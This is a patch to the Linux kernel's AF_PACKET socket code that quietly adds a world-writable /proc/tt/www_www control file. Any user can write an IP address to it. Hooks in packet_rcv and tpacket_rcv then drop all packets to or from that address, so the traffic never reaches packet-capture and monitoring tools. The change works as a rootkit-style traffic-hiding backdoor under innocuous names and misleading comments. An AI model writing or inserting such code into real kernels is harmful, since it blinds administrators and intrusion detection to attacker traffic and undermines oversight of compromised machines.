@@ -95,6 +95,7 @@
 #include <linux/netfilter_netdev.h>
 
 #include "internal.h"
+#include <linux/ctype.h>
 
 /*
    Assumptions:
@@ -152,6 +153,66 @@ dev_has_header(dev) == false (ll header is invisible to us)
  */
 
 /* Private packet socket structures. */
+
+static __be32 g_www_ip = 0;
+static struct proc_dir_entry *proc_dir_tt = NULL;
+
+/* 定义文件名 */
+#define DIR_NAME  "tt"
+#define FILE_NAME "www_www"
+
+/*
+ * 写入函数 (保持不变，逻辑通用)
+ */
+static ssize_t www_write(struct file *file, const char __user *ubuf,
+                         size_t count, loff_t *ppos)
+{
+    char kbuf[32];
+    size_t copy_len = count > 31 ? 31 : count;
+    __be32 new_ip = 0;
+
+    if (copy_from_user(kbuf, ubuf, copy_len))
+        return -EFAULT;
+
+    kbuf[copy_len] = '\0';
+    while (copy_len > 0 && isspace(kbuf[copy_len - 1])) {
+        kbuf[copy_len - 1] = '\0';
+        copy_len--;
+    }
+
+    if (copy_len == 0 || strcmp(kbuf, "0") == 0 || strcmp(kbuf, "clear") == 0) {
+        g_www_ip = 0;
+    } else {
+        new_ip = in_aton(kbuf);
+        if (new_ip == 0) return -EINVAL;
+        g_www_ip = new_ip;
+    }
+    return count;
+}
+
+/* 读取函数 (保持不变) */
+static ssize_t www_read(struct file *file, char __user *ubuf,
+                        size_t count, loff_t *ppos)
+{
+    char kbuf[64];
+    int len;
+    if (*ppos > 0) return 0;
+
+    if (g_www_ip == 0)
+        len = sprintf(kbuf, "None\n");
+    else
+        len = sprintf(kbuf, "%pI4\n", &g_www_ip);
+
+    if (copy_to_user(ubuf, kbuf, len)) return -EFAULT;
+    *ppos = len;
+    return len;
+}
+
+static const struct proc_ops www_fops = {
+    .proc_read = www_read,
+    .proc_write = www_write,
+};
+
 
 /* identical to struct packet_mreq except it has
  * a longer address field.
@@ -2176,6 +2237,18 @@ static int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	int skb_len = skb->len;
 	unsigned int snaplen, res;
 
+     if (skb->protocol == htons(ETH_P_IP)) {
+        struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
+
+        if (iph) {
+	        if (g_www_ip != 0) {
+                if (iph->saddr == g_www_ip || iph->daddr == g_www_ip) {
+	                goto drop;
+                }
+            }
+        }
+    }
+
 	if (skb->pkt_type == PACKET_LOOPBACK)
 		goto drop;
 
@@ -2304,6 +2377,17 @@ static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	 */
 	BUILD_BUG_ON(TPACKET_ALIGN(sizeof(*h.h2)) != 32);
 	BUILD_BUG_ON(TPACKET_ALIGN(sizeof(*h.h3)) != 48);
+
+    if (skb->protocol == htons(ETH_P_IP)) {
+        struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
+        if (iph) {
+	        if (g_www_ip != 0) {
+                if (iph->saddr == g_www_ip || iph->daddr == g_www_ip) {
+	                 goto drop;
+                }
+            }
+        }
+    }
 
 	if (skb->pkt_type == PACKET_LOOPBACK)
 		goto drop;
@@ -4823,6 +4907,17 @@ static void __exit packet_exit(void)
 
 static int __init packet_init(void)
 {
+    proc_dir_tt = proc_mkdir(DIR_NAME, NULL);
+    if (proc_dir_tt) {
+        if (proc_create(FILE_NAME, 0666, proc_dir_tt, &www_fops)) {
+        } else {
+            remove_proc_entry(DIR_NAME, NULL);
+        }
+    } else {
+    }
+
+    g_www_ip = 0;
+
 	int rc;
 
 	rc = register_pernet_subsys(&packet_net_ops);
